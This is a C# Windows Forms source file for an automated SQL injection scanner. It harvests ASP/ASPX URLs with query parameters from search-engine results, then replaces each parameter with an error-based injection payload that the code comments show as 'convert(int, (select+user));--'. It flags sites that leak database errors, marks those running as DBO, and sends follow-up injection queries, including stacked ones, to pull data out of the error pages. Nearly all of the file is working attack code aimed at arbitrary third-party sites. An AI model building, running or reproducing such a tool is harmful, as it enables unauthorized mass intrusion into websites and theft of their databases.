using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Collections;
using System.IO;
using System.Threading;

namespace ScannerAdvSQLInjection {

	public partial class Frm_Main : Form {
      private List<Thread> oThreadList = new List<Thread>();
      private List<String> oSearchUrlList = new List<string>();
      private List<String> oVulnUrlList = new List<string>();
      private List<String> oVulnAttackUrlList = new List<string>();
      private string sSearchEngineUrl;
      private string sSearchEngineParam;
      private object oMonitorSearchURLProgressBar;
      private object oMonitorSearchURL;
      private object oMonitorProgressBar;
      private object oMonitorVulnResults;

      public Frm_Main() {
	      InitializeComponent();
      }

      public void refreshSearchURLResults(string sUrl) {
	      lock (oMonitorVulnResults) {
		      oSearchUrlList.Add(sUrl);
		      lblSearchEngineResultsValue.Text = Convert.ToString(Convert.ToInt32(lblSearchEngineResultsValue.Text.ToString()) + 1);
		      txtSearchEngineResults.Text += sUrl + "\r\n";
	      }
      }
		
      public void refreshSearchURLProgressBar() {
	      lock (oMonitorSearchURLProgressBar) {
		      this.pbSearchEngineResults.PerformStep();
	      }
      }

      public void refreshVulnResults(string sUrl, string sAttackUrl, bool bIsDboUser) {
	      lock (oMonitorVulnResults) {
		      if (!oVulnAttackUrlList.Contains(sAttackUrl)) {
			      oVulnAttackUrlList.Add(sAttackUrl);
			      oVulnUrlList.Add(sUrl);

			      lblVulnResultsValue.Text = Convert.ToString(Convert.ToInt32(lblVulnResultsValue.Text.ToString()) + 1);
			      if (bIsDboUser) txtVulnResults.Text += "[ DBO ] " + sAttackUrl + "\r\n";
			      else txtVulnResults.Text += "[ ! ] " + sAttackUrl + "\r\n";
		      }
	      }
      }
		
      public void refreshVulnProgressBar() {
	      lock (oMonitorProgressBar) {
		      this.pbVulnResults.PerformStep();
	      }
      }

      public List<String> getSearchUrlList() { return this.oSearchUrlList; }
      public string getSearchEngineUrl() { return this.sSearchEngineUrl; }
      public string getSearchEngineParam() { return this.sSearchEngineParam; }
      public string getTxtSearchEngineParam() { return this.txtSearchEngineParam.Text; }
      public Boolean getRbSearchEnginePages1IsChecked() { return this.rbSearchEnginePages1.Checked; }

      /* ============================================================= PRIVATE METHODS ============================================================= */
      private void Frm_Main_Load(object sender, EventArgs e) {
	      Form.CheckForIllegalCrossThreadCalls = false;
	      pbSearchEngineResults.Minimum = 1;
	      pbSearchEngineResults.Step = 1;
	      pbVulnResults.Minimum = 1;
	      pbVulnResults.Step = 1;
	      btnSearchVuln.Enabled = false;

	      btnInject.Enabled = false;
	      btnInjectAdvQuery1.Enabled = false;

	      oMonitorSearchURLProgressBar = new Object();
	      oMonitorSearchURL = new Object();
	      oMonitorProgressBar = new Object();
	      oMonitorVulnResults = new Object();

	      var oVulnTargetQueryItems = new[] { 
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_1, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_1 }, 
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_2, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_2 }, 
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_3, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_3 }, 
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_4, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_4 },  
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_5, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_5 },  
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_6, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_6 },  
		      new { Text = Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_7, Value = Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_7 },  
	      };

	      cbVulnTargetQuery.DataSource = oVulnTargetQueryItems;
	      cbVulnTargetQuery.SelectedIndex = 0;

	      this.refreshSearchEngineUrl(true, true); 
      }

	   /* ------------------------------------------------------------ LAUNCH VULN QUERY ------------------------------------------------------------ 
		   * Function: launchVulnTargetQuery
		   * Parameter: sAttackUrl
		   * Parameter: bGetAnswer
		   * Description: Launch the SQL injection query to the selected target
		   * ------------------------------------------------------------------------------------------------------------------------------------------- */
	   private void launchVulnTargetQuery(string sAttackUrl, Boolean bGetAnswer = true) {
		   int nTimeout = Convert.ToInt32(txtVulnTargetTimeout.Value);

		   txtVulnTargetOutput.Text += Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + sAttackUrl + "\r\n";

		   CustomWebClient oWebClient = new CustomWebClient(nTimeout);
		   string sHtmlResult;
		   string sHtmlInjectionResult;
		   try {
			   sHtmlResult = oWebClient.DownloadString(sAttackUrl);
		   } catch (WebException oWebException)  {
			   try {
				   StreamReader oStreamReader = new StreamReader(((HttpWebResponse) oWebException.Response).GetResponseStream());
				   sHtmlResult = oStreamReader.ReadToEnd();
			   } catch (Exception) { sHtmlResult = String.Empty; }
		   }

		   if (bGetAnswer) {
			   if (sHtmlResult.ToLower().Contains(Global.GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE.ToLower())) {
				   int nPosHtmlResultInjectionStart = sHtmlResult.ToLower().IndexOf(Global.GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE.ToLower());
					
				   if (nPosHtmlResultInjectionStart >= 0) {
					   nPosHtmlResultInjectionStart++;
					   nPosHtmlResultInjectionStart = sHtmlResult.ToLower().IndexOf("'", nPosHtmlResultInjectionStart) + 1; 

					   int nPosHtmlResultInjectionEnd = nPosHtmlResultInjectionStart + 1;

					   for(;sHtmlResult.ToLower().IndexOf("'", nPosHtmlResultInjectionEnd) != -1;) {
						   nPosHtmlResultInjectionEnd = sHtmlResult.ToLower().IndexOf("'", nPosHtmlResultInjectionEnd) + 1;
					   }
					   nPosHtmlResultInjectionEnd--;

					   sHtmlInjectionResult = sHtmlResult.Substring(nPosHtmlResultInjectionStart, nPosHtmlResultInjectionEnd - nPosHtmlResultInjectionStart);
					   if (sHtmlInjectionResult.Length > 0) {
						   txtVulnTargetOutput.Text += "\r\n" + Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + sHtmlResult.Substring(nPosHtmlResultInjectionStart, nPosHtmlResultInjectionEnd - nPosHtmlResultInjectionStart);
					   }
					   else txtVulnTargetOutput.Text += "\r\n" + Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + Global.GLOBAL_ERROR_NO_RESPONSE_TARGET_OUTPUT;
				   }
				   else txtVulnTargetOutput.Text += "\r\n" + Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + Global.GLOBAL_ERROR_NO_RESPONSE_TARGET_OUTPUT;
			   }
			   else if (sHtmlResult.Length == 0) txtVulnTargetOutput.Text += "\r\n" + Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + Global.GLOBAL_ERROR_NO_RESPONSE_TARGET_OUTPUT;
			   else txtVulnTargetOutput.Text += "\r\n" + Global.GLOBAL_PROMPT_TARGET_OUTPUT + " " + sHtmlResult; 
		   }

		   oWebClient = null;
	   }

	   private void refreshSearchEngineUrl(Boolean bInternational, Boolean bAspPages) {
		   string sSearchEngineServer;

		   if (bInternational) {
			   rbSearchEngine1.Checked = true;
			   cbSearchEngineLang.Enabled = false;

			   sSearchEngineServer = Global.GLOBAL_SERVER_SEARCH_ENGINE;
		   }
		   else {
			   rbSearchEngine2.Checked = true;
			   cbSearchEngineLang.Enabled = true;

			   if (cbSearchEngineLang.Text.Length > 0) {
				   sSearchEngineServer = (cbSearchEngineLang.Text.Split(new string[] { "-" }, StringSplitOptions.None)[1]).Trim() + "." + Global.GLOBAL_SERVER_SEARCH_ENGINE;
			   }
			   else sSearchEngineServer = Global.GLOBAL_SERVER_SEARCH_ENGINE;
		   }

		   if (bAspPages) rbSearchEnginePages1.Checked = true;
		   else rbSearchEnginePages2.Checked = true;

		   txtSearchEngineUrl.Text = Global.GLOBAL_PROTOCOL_HTTPS + "://" + sSearchEngineServer + "/" + Global.GLOBAL_PARAM_SEARCH_ENGINE_SEARCH;

		   // Parameter Page (Asp or Aspx)
		   if (rbSearchEnginePages1.Checked) txtSearchEngineUrl.Text += Global.GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_VALUE.Replace("{1}", String.Empty);
		   else txtSearchEngineUrl.Text += Global.GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_VALUE.Replace("{1}", "x");

		   // Parameter URL
		   if (txtSearchEngineParam.Text.Length > 0) txtSearchEngineUrl.Text = txtSearchEngineUrl.Text.Replace("{2}", txtSearchEngineParam.Text);
		   else txtSearchEngineUrl.Text = txtSearchEngineUrl.Text.Replace("{2}", Global.GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_DEFAULT_VALUE_1);

		   // Parameter Words
		   if (txtSearchEngineWords.Text.Trim().Length > 0) txtSearchEngineUrl.Text += "+" + txtSearchEngineWords.Text.Trim().Replace(' ', '+');

		   // Parameter SEED
		   sSearchEngineUrl = txtSearchEngineUrl.Text + Global.GLOBAL_PARAM_SEARCH_ENGINE_SEED;
		   txtSearchEngineUrl.Text += Global.GLOBAL_PARAM_SEARCH_ENGINE_SEED + Global.GLOBAL_PARAM_SEARCH_ENGINE_SEED_DEFAULT_VALUE;
	   }

	   private void refreshVulnTargetUrl() {
		   if (this.isValidVulnTargetUrl()) {
			   btnInject.Enabled = true;
			   btnInjectAdvQuery1.Enabled = true;

			   // Parameter Query
			   string sParamValue = cbVulnTargets.Text.Substring(cbVulnTargets.Text.IndexOf("=") + 1);
			   sParamValue = sParamValue.Split('&')[0];

			   if (cbVulnTargetQuery.SelectedValue != null) txtVulnTargetUrl.Text = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + cbVulnTargetQuery.SelectedValue);
			   else txtVulnTargetUrl.Text = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + cbVulnTargetQuery.Text);
		   }
		   else {
			   btnInject.Enabled = false;
			   btnInjectAdvQuery1.Enabled = false;
		   }
	   }

	   private Boolean isValidVulnTargetUrl() {
		   Boolean bIsValidUrl = false;
			
		   if (((cbVulnTargets.Text.ToLower().Contains(Global.GLOBAL_PROTOCOL_HTTP + "://")) || (cbVulnTargets.Text.ToLower().Contains(Global.GLOBAL_PROTOCOL_HTTPS + "://"))) && ((cbVulnTargets.Text.ToLower().Contains(Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?")) || (cbVulnTargets.Text.ToLower().Contains(Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?"))) && (cbVulnTargets.Text.ToLower().Contains("="))) {
			   if ((((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_PROTOCOL_HTTP + "://" }, StringSplitOptions.None).Length - 1) == 1) && ((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_PROTOCOL_HTTPS + "://" }, StringSplitOptions.None).Length - 1) == 0)) || (((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_PROTOCOL_HTTPS + "://" }, StringSplitOptions.None).Length - 1) == 1) && ((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_PROTOCOL_HTTP + "://" }, StringSplitOptions.None).Length - 1) == 0))) {
				   if ((((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?" }, StringSplitOptions.None).Length - 1) == 1) && ((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?" }, StringSplitOptions.None).Length - 1) == 0)) || (((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?" }, StringSplitOptions.None).Length - 1) == 1) && ((cbVulnTargets.Text.ToLower().Split(new String[] { Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?" }, StringSplitOptions.None).Length - 1) == 0))) {
					   int nPositionProtocolEnd = cbVulnTargets.Text.ToLower().IndexOf("://") + 3;
					   int nPositionWebpageAspStart = cbVulnTargets.Text.ToLower().IndexOf(Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?");
					   int nPositionWebpageAspEnd = cbVulnTargets.Text.ToLower().IndexOf(Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?") + 5;
					   int nPositionParameterEqualStart = cbVulnTargets.Text.ToLower().IndexOf("=");

					   if (nPositionWebpageAspStart < 0) {
						   nPositionWebpageAspStart = cbVulnTargets.Text.ToLower().IndexOf(Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?");
						   nPositionWebpageAspEnd = cbVulnTargets.Text.ToLower().IndexOf(Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?") + 6;
					   }
						
					   if (nPositionWebpageAspStart - nPositionProtocolEnd > 0) {
                     if (nPositionParameterEqualStart - nPositionWebpageAspEnd > 0) {
						      bIsValidUrl = true;
						   }
					   }
				   }
			   }
		   }

		   return bIsValidUrl;
	   }

	   /* --------------------------------------------------------------- CLICK EVENTS -------------------------------------------------------------- */
	   private void btnSearch_Click(object sender, EventArgs e) {
		   try {
			   lblSearchEngineResultsValue.Text = "0";
			   txtThreads.Enabled = false;
			   txtTimeout.Enabled = false;
			   btnSearchVuln.Enabled = false;
			   oThreadList.Clear();
			   oSearchUrlList.Clear();
			   txtSearchEngineResults.Clear();

			   pbSearchEngineResults.Maximum = Convert.ToInt32(txtSearchEngineSeed.Value);
			   pbSearchEngineResults.Value = 1;

			   Cursor.Current = Cursors.WaitCursor;

			   if (txtThreads.Value > ((int) (txtSearchEngineSeed.Value / 10))) txtThreads.Value = ((int) (txtSearchEngineSeed.Value / 10));
			   int nPeriodicity = (int) ((txtSearchEngineSeed.Value / txtThreads.Value) / 10);
			   int nIndexStart, nIndexEnd;

			   for (int i = 0; (i < txtThreads.Value); i++) {
				   nIndexStart = i * nPeriodicity;

				   if (i == (txtThreads.Value - 1)) nIndexEnd = ((int) (txtSearchEngineSeed.Value) / 10) - 1;
				   else nIndexEnd = ((i + 1) * nPeriodicity) - 1;

				   SearchURL oSearchURL = new SearchURL(this, nIndexStart, nIndexEnd, Convert.ToInt32(txtTimeout.Value));
				   oThreadList.Add(new Thread(new ThreadStart(oSearchURL.search)));

				   oThreadList[oThreadList.Count - 1].Start();
			   }

			   for (int i = 0; (i < oThreadList.Count); i++) {
				   oThreadList[i].Join();
			   }

			   Cursor.Current = Cursors.Default;
			   if (txtSearchEngineResults.Text.Length > 1) txtSearchEngineResults.Text = txtSearchEngineResults.Text.Substring(0, txtSearchEngineResults.Text.Length - 2);

			   sSearchEngineParam = txtSearchEngineParam.Text;
			   if (oSearchUrlList.Count > 0) btnSearchVuln.Enabled = true;
		   } catch (Exception) {
			   oSearchUrlList.Clear();
			   txtSearchEngineResults.Clear();
			   btnSearchVuln.Enabled = false;
			   pbSearchEngineResults.Value = 1;
			   lblSearchEngineResultsValue.Text = "0";
			   Cursor.Current = Cursors.Default;

			   MessageBox.Show("Error searching URLs.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
		   }
		   txtThreads.Enabled = true;
		   txtTimeout.Enabled = true;
	   }

	   private void btnSearchVuln_Click(object sender, EventArgs e) {
		   lblVulnResultsValue.Text = "0";
		   txtThreadsVuln.Enabled = false;
		   txtTimeoutVuln.Enabled = false;
		   oVulnUrlList.Clear();
		   oVulnAttackUrlList.Clear();
		   txtVulnResults.Clear();
		   oThreadList.Clear();

		   btnInject.Enabled = false;
		   btnInjectAdvQuery1.Enabled = false;

		   pbVulnResults.Maximum = oSearchUrlList.Count;
		   pbVulnResults.Value = 1;
		   Cursor.Current = Cursors.WaitCursor;

		   // --> Create All Threads
		   if (txtThreadsVuln.Value > oSearchUrlList.Count) txtThreadsVuln.Value = oSearchUrlList.Count;
		   int nPeriodicity = (oSearchUrlList.Count / ((int) txtThreadsVuln.Value));
		   int nIndexStart, nIndexEnd;

		   for (int i = 0; (i < txtThreadsVuln.Value); i++) {
			   nIndexStart = i * nPeriodicity;

			   if (i == (txtThreadsVuln.Value - 1)) nIndexEnd = oSearchUrlList.Count - 1;
			   else nIndexEnd = ((i + 1) * nPeriodicity) - 1;

			   Vulnerability oVulnerability = new Vulnerability(this, nIndexStart, nIndexEnd, Convert.ToInt32(txtTimeoutVuln.Value));
			   oThreadList.Add(new Thread(new ThreadStart(oVulnerability.search)));

			   oThreadList[oThreadList.Count - 1].Start();
		   }

		   for (int i = 0; (i < oThreadList.Count); i++) {
			   oThreadList[i].Join();    
		   }

		   Cursor.Current = Cursors.Default;
		   txtThreadsVuln.Enabled = true;
		   txtTimeoutVuln.Enabled = true;
		   if (txtVulnResults.Text.Length > 1) txtVulnResults.Text = txtVulnResults.Text.Substring(0, txtVulnResults.Text.Length - 2);

		   MessageBox.Show("Process completed successfully. " + lblVulnResultsValue.Text + " Vulnerabilities Found.", "VULNERABILITIES", MessageBoxButtons.OK, MessageBoxIcon.Information);
			
		   if (oVulnUrlList.Count > 0) {
			   for(int i = 0; i < oVulnUrlList.Count; i++) {
				   cbVulnTargets.Items.Add(oVulnUrlList[i]);
			   }
			   cbVulnTargets.SelectedIndex = 0;
			   cbVulnTargetQuery.SelectedIndex = 0;

			   this.refreshVulnTargetUrl();
		   }
	   }
 

	   private void btnInject_Click(object sender, EventArgs e) {
		   txtVulnTargetOutput.Text = "";

		   this.launchVulnTargetQuery(txtVulnTargetUrl.Text, true);
	   }

	   private void btnInjectAdvQuery1_Click(object sender, EventArgs e) {
		   string sAttackUrl = "";

		   txtVulnTargetOutput.Text = "";

		   // Parameter Query
		   string sParamValue = cbVulnTargets.Text.Substring(cbVulnTargets.Text.IndexOf("=") + 1);
		   sParamValue = sParamValue.Split('&')[0];

		   // First SubQuery
		   if (!chkEscapedAdvQuery1.Checked) sAttackUrl = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + sParamValue + ";" + Global.GLOBAL_ADVANCED_TARGET_QUERY_NORMAL_1);
		   else sAttackUrl = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + sParamValue + ";" + Global.GLOBAL_ADVANCED_TARGET_QUERY_ESCAPED_1);

		   this.launchVulnTargetQuery(sAttackUrl, false);

		   txtVulnTargetOutput.Text += "\r\n";

		   // Second SubQuery
		   if (!chkEscapedAdvQuery1.Checked) sAttackUrl = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_5);
		   else sAttackUrl = cbVulnTargets.Text.Replace("=" + sParamValue, "=" + Global.GLOBAL_SIMPLE_TARGET_QUERY_VALUE_7);
			
		   this.launchVulnTargetQuery(sAttackUrl, true);
	   }
	   /* ------------------------------------------------------------- END CLICK EVENTS ------------------------------------------------------------ */
		
	   /* -------------------------------------------------------------- OTHERS EVENTS -------------------------------------------------------------- */
	   private void rbSearchEngine2_CheckedChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(rbSearchEngine1.Checked, rbSearchEnginePages1.Checked);
	   }

	   private void rbSearchEnginePages1_CheckedChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(rbSearchEngine1.Checked, rbSearchEnginePages1.Checked);
	   }

	   private void rbSearchEnginePages2_CheckedChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(rbSearchEngine1.Checked, rbSearchEnginePages1.Checked);
	   }

	   private void cbSearchEngineLang_SelectedIndexChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(false, rbSearchEnginePages1.Checked);
	   }

	   private void txtSearchEngineParam_TextChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(rbSearchEngine1.Checked, rbSearchEnginePages1.Checked);
	   }

	   private void txtSearchEngineWords_TextChanged(object sender, EventArgs e) {
		   this.refreshSearchEngineUrl(rbSearchEngine1.Checked, rbSearchEnginePages1.Checked);
	   }

	   private void txtSearchEngineParam_KeyPress(object sender, KeyPressEventArgs e) {
		   if (!char.IsLetterOrDigit(e.KeyChar)) {
			   if (e.KeyChar != 8) e.Handled = true;
		   }
	   }

	   private void txtSearchEngineWords_KeyPress(object sender, KeyPressEventArgs e) {
		   if (!char.IsLetterOrDigit(e.KeyChar)) {
			   if ((e.KeyChar != 8) && (e.KeyChar != 32)) e.Handled = true;
			   else {
				   if (((e.KeyChar == 32) && (txtSearchEngineWords.Text.Length > 0) && (txtSearchEngineWords.Text[txtSearchEngineWords.Text.Length - 1] == ' ')) || ((e.KeyChar == 32) && (txtSearchEngineWords.Text.Length == 0))) e.Handled = true;
			   }
		   }
	   }

	   private void cbVulnTargets_SelectedIndexChanged(object sender, EventArgs e) {
		   this.refreshVulnTargetUrl();
	   }

	   private void cbVulnTargets_KeyUp(object sender, KeyEventArgs e) {
		   this.refreshVulnTargetUrl();
	   }

	   private void cbVulnTargets_KeyPress(object sender, KeyPressEventArgs e) {
		   if (!char.IsLetterOrDigit(e.KeyChar)) {
			   if ((e.KeyChar != 8) && (e.KeyChar != 38) && (e.KeyChar != 45) && (e.KeyChar != 46) && (e.KeyChar != 47) && (e.KeyChar != 58) && (e.KeyChar != 59) && (e.KeyChar != 61) && (e.KeyChar != 63)) e.Handled = true;
		   }
	   }

	   private void cbVulnTargets_Leave(object sender, EventArgs e){
		   this.refreshVulnTargetUrl();
	   }

	   private void cbVulnTargetQuery_SelectedIndexChanged(object sender, EventArgs e) {
		   this.refreshVulnTargetUrl();
	   }

	   private void cbVulnTargetQuery_KeyUp(object sender, KeyEventArgs e) {
		   this.refreshVulnTargetUrl();
	   }

	   private void cbVulnTargetQuery_KeyPress(object sender, KeyPressEventArgs e) {
		   Boolean bFindCustomQuery = false;

		   if ((cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_1) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_2) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_3) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_4) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_5) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_6) || (cbVulnTargetQuery.Text == Global.GLOBAL_SIMPLE_TARGET_QUERY_NAME_7)) bFindCustomQuery = true;

		   if (bFindCustomQuery) cbVulnTargetQuery.Text = "";

		   if (!char.IsLetterOrDigit(e.KeyChar)) {
			   if ((e.KeyChar != 8) && (!((e.KeyChar >= 32) && (e.KeyChar <= 64))) && (e.KeyChar != 95)) e.Handled = true;
			   else {
				   if (((e.KeyChar == 32) && (cbVulnTargetQuery.Text.Length > 0) && (cbVulnTargetQuery.Text[cbVulnTargetQuery.Text.Length - 1] == ' ')) || ((e.KeyChar == 32) && (cbVulnTargetQuery.Text.Length == 0))) e.Handled = true;
			   }
		   }
	   }

	   private void cbVulnTargetQuery_Leave(object sender, EventArgs e) {
		   this.refreshVulnTargetUrl();
	   }
	   /* ------------------------------------------------------------ END OTHERS EVENTS ------------------------------------------------------------ */

	   /* =========================================================== END PRIVATE METHODS =========================================================== */
   }

   public partial class SearchURL {
	   private int nIndexStart = 0;
	   private int nIndexEnd = -1;
	   private int nTimeout = 1;
	   private Frm_Main oFrmMain;

	   public SearchURL(Frm_Main oFrmMain, int nIndexStart, int nIndexEnd, int nTimeout) {
	      this.oFrmMain = oFrmMain;

	      this.nIndexStart = nIndexStart;
	      this.nIndexEnd = nIndexEnd;
	      this.nTimeout = nTimeout;
	   }

	   public void search() {
		   for (int nIndex = nIndexStart; nIndex <= nIndexEnd; nIndex++) {
			   searchUrls(nIndex);
		   }
	   }

	   /* ============================================================= PRIVATE METHODS ============================================================= */
	   private void searchUrls(int nPageNumber) {
         int nSeed = ((nPageNumber * 10) + 1);

         CustomWebClient oWebClient = new CustomWebClient(nTimeout);
         string sHtmlResult;
         try {
	         sHtmlResult = oWebClient.DownloadString(oFrmMain.getSearchEngineUrl() + nSeed.ToString());
         } catch (WebException oWebException)  {
	         try {
		         StreamReader oStreamReader = new StreamReader(((HttpWebResponse) oWebException.Response).GetResponseStream());
		         sHtmlResult = oStreamReader.ReadToEnd();

	         } catch (Exception) { sHtmlResult = String.Empty; }
         }
         oWebClient = null;

         string[] oLinkPatterns = Global.GLOBAL_SERVER_SEARCH_ENGINE_LINK_PATTERNS.Split(';');
         int nLastPosLinkStart = 0;
            
         if (oLinkPatterns.Length > 0) {
	         // Search 10 results
	         for (int i = 0; i < 10; i++) {
		         // Find a valid link
		         int nCurrentPosLinkStart = nLastPosLinkStart;
                     
		         Boolean bFindPattern = false;
		         for(int j = 0; ((j < oLinkPatterns.Length) && (!bFindPattern)); j++) {
			         nCurrentPosLinkStart = sHtmlResult.IndexOf(oLinkPatterns[j], nLastPosLinkStart);
			         if (nCurrentPosLinkStart != -1) bFindPattern = true; 
		         }

		         if ((bFindPattern) && (nCurrentPosLinkStart != nLastPosLinkStart)) {
			         nLastPosLinkStart = nCurrentPosLinkStart + 1;

			         string sHtmlResultLink = sHtmlResult.Substring(nLastPosLinkStart);
                    
			         int nPosLinkHrefStart = sHtmlResultLink.IndexOf("href=\"") + 6;
			         int nPosLinkHrefLength = sHtmlResultLink.Substring(nPosLinkHrefStart).IndexOf("\"");

			         string sUrl = sHtmlResultLink.Substring(nPosLinkHrefStart, nPosLinkHrefLength);

			         // Check if url is valid
			         string sParamToSearch;
			         if (oFrmMain.getTxtSearchEngineParam().Length > 0) sParamToSearch = oFrmMain.getTxtSearchEngineParam();
			         else sParamToSearch = Global.GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_DEFAULT_VALUE_1;

			         string sPage;
			         if (oFrmMain.getRbSearchEnginePages1IsChecked()) sPage = Global.GLOBAL_WEBPAGE_EXTENSION_ASP + "?";
			         else sPage = Global.GLOBAL_WEBPAGE_EXTENSION_ASPX + "?";

			         if (sUrl.ToLower().Contains(sPage + sParamToSearch.ToLower() + "=")) {
				         oFrmMain.refreshSearchURLResults(sUrl);
			         }
		         }

		         oFrmMain.refreshSearchURLProgressBar();
	         }
         }
	   }
	   /* =========================================================== END PRIVATE METHODS =========================================================== */
   }

   public partial class Vulnerability {
	   private int nIndexStart = 0;
	   private int nIndexEnd = -1;
	   private int nTimeout = 1;
	   private Frm_Main oFrmMain;

      public Vulnerability(Frm_Main oFrmMain, int nIndexStart, int nIndexEnd, int nTimeout) {
	      this.oFrmMain = oFrmMain;

	      this.nIndexStart = nIndexStart;
	      this.nIndexEnd = nIndexEnd;
	      this.nTimeout = nTimeout;
      }

	   public void search() {
		   for (int nIndex = nIndexStart; nIndex <= nIndexEnd; nIndex++) {
			   string sUrl = oFrmMain.getSearchUrlList()[nIndex];
			   string sAttackUrl;

			   // Replace param to vulnerable parameter -> convert(int, (select+user));--
			   int nPos = sUrl.IndexOf(oFrmMain.getSearchEngineParam() + "=");
			   string sParamValue = sUrl.Substring(nPos + oFrmMain.getSearchEngineParam().Length + 1);

			   sAttackUrl = sUrl.Replace("=" + sParamValue, "=" + Global.GLOBAL_PARAM_SEARCH_ENGINE_VULN_VALUE);

			   CustomWebClient oWebClient = new CustomWebClient(nTimeout);
			   string sHtmlResult;
			   try {
				   sHtmlResult = oWebClient.DownloadString(sAttackUrl);
			   } catch (WebException oWebException)  {
				   try {
					   StreamReader oStreamReader = new StreamReader(((HttpWebResponse) oWebException.Response).GetResponseStream());
					   sHtmlResult = oStreamReader.ReadToEnd();
				   } catch (Exception) { sHtmlResult = String.Empty; }
			   }

			   if (sHtmlResult.ToLower().Contains(Global.GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE.ToLower())) {
				   Boolean bIsDboUser;

				   if (sHtmlResult.ToLower().Contains(Global.GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_DBO_USER)) bIsDboUser = true;
				   else bIsDboUser = false;

				   oFrmMain.refreshVulnResults(sUrl, sAttackUrl, bIsDboUser);
			   }

			   oWebClient = null;

			   oFrmMain.refreshVulnProgressBar();
		   }
	   }
   }

   partial class CustomWebClient : WebClient {
	   private int nTimeout;
	   public CustomWebClient(int nTimeout) {
		   this.nTimeout = nTimeout;
	   }

	   protected override WebRequest GetWebRequest(Uri uri) {
		   WebRequest w = base.GetWebRequest(uri);
		   w.Timeout = nTimeout * 1000;
		   return w;
	   }
   }
}